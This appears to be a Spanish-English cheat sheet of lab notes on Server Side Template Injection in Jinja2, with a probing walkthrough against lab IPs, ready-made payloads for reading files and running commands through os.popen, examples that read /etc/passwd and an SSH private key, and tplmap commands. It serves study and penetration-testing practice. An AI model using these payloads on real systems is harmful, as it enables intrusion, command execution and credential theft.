# Server Side Template Injection (SSTI)

## What is Server Side Template Injection? 
Server Side Template Injection (SSTI) is a web exploit which takes advantage of an insecure implementation of a template engine.

## What is a template engine?
A template engine allows you to create static template files which can be re-used in your application.

Es cuando un usuario es capaz de pasar un parámetro que puede controlar el mecanismo de plantillas (templates) que está corriendo en el servidor.
Diferentes motores de plantilla tienen diferentes payloads, sin embargo puedes probar SSTI usando {{2+2}} como una prueba.

### Ejemplo

```
http://10.10.216.244:5000/profile/juan
Welcome to the profile of juan!

http://10.10.216.244:5000/profile/{{
Internal Server Error
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.

http://10.10.216.244:5000/profile/{{7*7}}
Welcome to the profile of 49!

http://10.10.216.244:5000/profile/{{7*'7'}}
Welcome to the profile of 7777777!

http://10.10.216.244:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}

```

Jinja2: https://jinja.palletsprojects.com/en/2.11.x/

Jinja2 is essentially a sub language of Python that doesn't integrate the **import** statement, which is why the above does not work.


- Payloads
```
{{ ''.__class__ }}
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[1] }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```



- Leer archivos
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}
```

- Ejecutar comandos
```
{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}
```
- Ejemplos:
```
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/test/.ssh/id_rsa').read()}}
```

- Con tmplmap
```
./tplmap.py -u http://10.10.10.10:5000/ -d 'noot' --os-cmd 'cat /etc/passwd'
./tplmap.py -u http://10.10.88.116 -d 'name' --os-cmd 'cat /flag'
```


## Referencias:
- Sitios
  - [PayloadAllTheThins Templates Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection)
- Tools
  - [Tplmap](https://github.com/epinna/tplmap)